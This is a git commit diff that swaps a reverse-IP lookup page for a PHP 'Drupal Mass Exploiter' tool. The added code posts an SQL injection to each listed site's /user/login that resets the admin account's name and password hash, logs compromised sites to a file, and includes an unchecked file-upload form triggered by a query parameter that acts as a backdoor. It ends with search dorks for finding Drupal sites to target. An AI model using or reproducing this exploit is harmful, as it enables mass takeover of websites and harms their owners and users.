02ee1799e45fd257e549612d40134971cd8634aa
antoniola <renata.cantiek@gmail.com>
2016-10-28 16:14:29 +0700

    6545wSAdfvdxub6vexgsdtjrykjzdgsdgfgfg
    dsgbdhxtjertxdrfdvfddfdsf

--- 873r872yieuhw987ipl00cup.php
+++ 873r872yieuhw987ipl00cup.php
@@ -1,47 +1,192 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><title> >-|I|-> Extrime |  Card <-|I|-< </title><link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
+<font class="hk2" style="text-shadow: 1px -1px 8px;"><style>
+body {
+	font-family: 'Arial'; font-size:12px;color:lime;
+	background-image: url('http://3.bp.blogspot.com/-D6nQQ3d_wfw/Ts31QI5aQPI/AAAAAAAAAgA/mMEBDufqDpk/s1600/0_1_1.gif');	}
+	hr {border:inset 1px white}
+
+#form-container
+	{ 	color:aqua;
+	font-family: 'Arial', sans-serif;
+	font-size:13px;
+		background-color: #131313;
+		border: solid 1px white;
+		border-radius:10px;
+		-moz-border-radius: 10px;
+		-webkit-border-radius: 10px;
+		box-shadow: 0px 0px 15px blue;
+		-moz-box-shadow: 0px 0px 15px #ff4eff;
+		-webkit-box-shadow: 0px 0px 15px #ff4eff;
+		margin:30px auto;
+		padding:10px;
+		width:680px;
+		text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+	}
+
+	input[type=text], textarea
+	{
+		background-color:#000;
+		border:solid 1px aqua; color:Aqua;
+		border-radius:5px;
+		-moz-border-radius: 5px;
+		-webkit-border-radius: 5px;
+	}
+	textarea { width:100%;height:200px; resize:none }
+	input[type=text] { width:160px;text-align:center }
+	input[type=text]:focus, textarea:focus { background-color:black; border:solid 1px white; color:lime; }
+	.submit-button
+	{
+		background: blue;
+		border:solid 1px #57A02C;
+		border-radius:5px;
+			-moz-border-radius: 5px;
+			-webkit-border-radius: 5px;
+		-moz-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
+		-webkit-box-shadow: 0 1px 3px rgba(0,0,0,0.6);
+		text-shadow: 0 -1px 1px rgba(0,0,0,0.25);
+		border-bottom: 1px solid rgba(0,0,0,0.25);
+		position: relative;
+		color:#FFF;
+		display: inline-block;
+		cursor:pointer;
+		font-size:13px;
+		padding:3px 8px;
+	}
+
+	.business{
+		color:yellow;
+		font-weight: bold;
+	}
+	.premier{
+		color:#00FF00;
+		font-weight: bold;
+	}
+	.verified{
+		color:#800080;
+		font-weight: bold;
+	}
+	.style2{text-align: center ;font-weight: bold;font-family: 'Arial'  ;color: Aqua;text-shadow: 0px 0px 60px aqua ;font-size: 50px}
+
+	.nolog{
+		font-size: 10px;
+		font: lime; } </style></head><body><div id="form-container"><div align="center" class="style2"><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#;border:2px inset white;">  Drupal Mass Exploiter </td></tr></table></div><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:#000;border:2px inset grey;background-image:url(http://4.bp.blogspot.com/-RbaCuWyoN3c/U9-IWbh17wI/AAAAAAAAAto/I8zpRHIP0Gg/s1600/kbk29185-227a592.gif);"><html><br><br>
 <?php
-echo "<head>\n"; 
-echo "<style>input[type=submit]{ padding: 3px; color: #;\n"; 
-echo "font-weight: bold;\n"; 
-echo "text-align: center;\n"; 
-echo "text-shadow: 0 1px rgba(255, 255, 255, 0.3);\n"; 
-echo "background: #;\n"; 
-echo "background-clip: padding-box;\n"; 
-echo "border: 1px solid #;\n"; 
-echo "border-bottom-color: #;\n"; 
-echo "border-radius: 4px;\n"; 
-echo "cursor: pointer;\n"; 
-echo "background-image:-webkit-linear-gradient(top, #, #);\n"; 
-echo "background-image: -moz-linear-gradient(top, #, #);\n"; 
-echo "background-image: -o-linear-gradient(top, #, #);\n"; 
-echo "background-image: linear-gradient(to bottom, #, #);\n"; 
-echo "-webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); } input[type=text]{ padding: 3px; color: #; text-shadow: # 0px 0px 3px; border: 1px solid #; background: transparent; box-shadow: 0px 0px 4px #; padding: 3px; -webkit-border-radius: 4px; -moz-border-radius: 4px; border-radius: 4px; -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px; -moz-box-shadow: # 0px 0px 4px;}\n"; 
-echo "</style>\n"; 
-echo "</head>\n";
-echo "<center>Reverse IP Domain Check</center>\n";
-echo "<center></center><div id=result>";
-echo "<center><br><form><input type='text' size='60' value='bawok.com' name='pentil' />&nbsp;<input type='submit' value='search'></form></center>";
-if(isset($_GET["pentil"]))
+@session_start(); 
+@error_reporting(0); 
+@ini_set('error_log',NULL); 
+@ini_set('log_errors',0); 
+@ini_set('max_execution_time',0); 
+@ini_set('display_errors', 0);
+@set_time_limit(0); 
+echo '<img src="https://3.bp.blogspot.com/-wLJw_NlOn7E/VzC1NVdwv9I/AAAAAAAAARE/DGLXUsdr8902CG_3y1zR7Em2uvadBG1IACLcB/s1600/sangar.jpg" width="0" height="0">';
 {
-$site = $_GET["pentil"];
-$nn = "http://domains.yougetsignal.com/domains.php";
-
-//Curl Function
-$ch = curl_init($nn);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
-curl_setopt($ch, CURLOPT_POSTFIELDS, "remoteAddress=$site&ket=");
-curl_setopt($ch, CURLOPT_HEADER, 0);
-curl_setopt($ch, CURLOPT_POST, 1);
-$resp = curl_exec($ch);
-$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",", str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
-$array = explode(",,", $resp);
-unset($array[0]);
-echo "<table style='margin: 0 auto'>";
-foreach($array as $lnk)
-{
-print "<tr><td><a style=\"color:#0076B1;\" href='$lnk' target=_blank>$lnk</a></td></tr>";
+echo "
+<center>
+<form method='post' action=''>
+<textarea name='url' style='margin: 0px; width: 419px; height: 119px'>
+http://www.site.com
+http://www.site2.com
+</textarea><br><br>
+<input type='submit' name='submit' value='Attack'>
+</form>
+<br>
+";
+$drupal7  = $_GET['drupal7'];
+if($drupal7 == 'drupal7'){
+$filename = $_FILES['file']['name'];
+$filetmp  = $_FILES['file']['tmp_name'];
+echo "<form method='POST' enctype='multipart/form-data'>
+   <input type='file'name='file' />
+   <input type='submit' value='drupal !' />
+</form>";
+move_uploaded_file($filetmp,$filename);
 }
-echo "</table>";
-curl_close($ch);
+    error_reporting(0);
+    if (isset($_POST['submit'])) {
+        function exploit($url) {
+            $post_data = "name[0;update users set name %3D 'HsH' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status %3D'1' where uid %3D '1';#]=Jan&name[]=Cok&pass=test&form_build_id=&form_id=user_login&op=Log+in";
+            $params = array('http' => array('method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded
+", 'content' => $post_data));
+            $ctx = stream_context_create($params);
+            $data = file_get_contents($url . '/user/login/', null, $ctx);
+            if ((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'Jan Cok') && $data)) {
+                $fp = fopen("Hasil.txt", 'a+');
+                fwrite($fp, "Exploitied  User: HsH Pass: admin  =====> {$url}/user/login");
+                fwrite($fp, "
+");
+                fwrite($fp, "--------------------------------------------------------------------------------------------------");
+                fwrite($fp, "
+");
+                fclose($fp);
+                               
+                echo "<font color='Darkviolet'><b>Success:<font color='lime'> HsH</font> Pass:<font color='Lime'> admin</font> =><a href='{$url}/user/login' target=_blank ><font color='Lime'> {$url}/user/login </font></a></font></b><br>";
+            } else {
+                echo "<font color='Darkred'><b>Tidak Bisa =></font> <font color='Dimgray'> {$url}/user/login</font></b><br>";
+            }
+        }
+               
+        $urls = explode("
+", $_POST['url']);
+        foreach ($urls as $url) {
+            $url = @trim($url);
+            echo exploit($url);
+        }
+    }
 }
+echo "<br />";
+echo'<center><a href="Hasil.txt">View Hasil Drupal Sites</a></cenrer>';
+?></td></tr></table><table width="100%" border="0"><tr><td align="center" style="width:50%;background-color:# ;border:1px solid #fff;">
+<center><script language="JavaScript1.2"> 
+var message=" ..::[+ © Copyright 2016 | Hacker Sakit Hati  +]::..  "// jangan pakai enter 
+var neonbasecolor=" white" 
+var neontextcolor=" aqua" 
+var neontextcolor2="purple"  // kode warna kedua 
+var flashspeed=1	// kecepatan flash neon, semakin kecil semakin cepat 
+var flashingletters=10	// jumlah huruf yang tersorot oleh flash 
+var flashingletters2=10	// jumlah warna di ekor flash 
+var flashpause=1					 
+///edit by http://googel-indonesia.blogspot.com/ 
+var n=0 
+if (document.all||document.getElementById){ 
+document.write('<font color="'+neonbasecolor+'">') 
+for (m=0;m<message.length;m++) 
+document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>') 
+document.write('</font>') 
+} 
+else 
+document.write(message) 
+function crossref(number){ 
+var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number) 
+return crossobj 
+} 
+function neon(){ 
+//Change all letters to base color 
+if (n==0){ 
+for (m=0;m<message.length;m++) 
+crossref(m).style.color=neonbasecolor 
+} 
+//cycle through and change individual letters to neon color 
+crossref(n).style.color=neontextcolor 
+ 
+if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2  
+if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor 
+if (n<message.length-1) 
+n++ 
+else{ 
+n=0 
+clearInterval(flashing) 
+setTimeout("beginneon()",flashpause) 
+return 
+} 
+} 
+function beginneon(){ 
+if (document.all||document.getElementById) 
+flashing=setInterval("neon()",flashspeed) 
+} 
+beginneon() 
+</script></b><center></center></center></a></center></tr></table></center></body></html></center></td></tr></table></td></ol></tr><tr></tr></table></center></body></html><br><center><div style="background-image:url(https://lh6.googleusercontent.com/-4hv9J9iHoTw/VcECr-PL4gI/AAAAAAAAACs/D9LPkvigfBE/w575-h10-no/graphicline.gif);"><marquee direction="right" scrollamount="100" align="center" behavior="alternate"> > > > > Drupal Mass Exploiter By Hacker Sakit Hati < < < < </marquee></div></center><object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" width="0" height="0"><param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" /><param name="bgcolor" value="#ffffff" /><param name="FlashVars" value="mp3=https%3A//hshmp3oke.googlecode.com/svn/HsH-Login.mp3&amp;width=0&amp;height=0&amp;autoplay=1&amp;volume=200" /></object></body></html>Dorks:<br>
+inurl:?q=node/<br>
+intext:Powered By Drupal<br>
+inurl:"node?page="<br>
+inurl:"news?page=" <br>
 
-?>
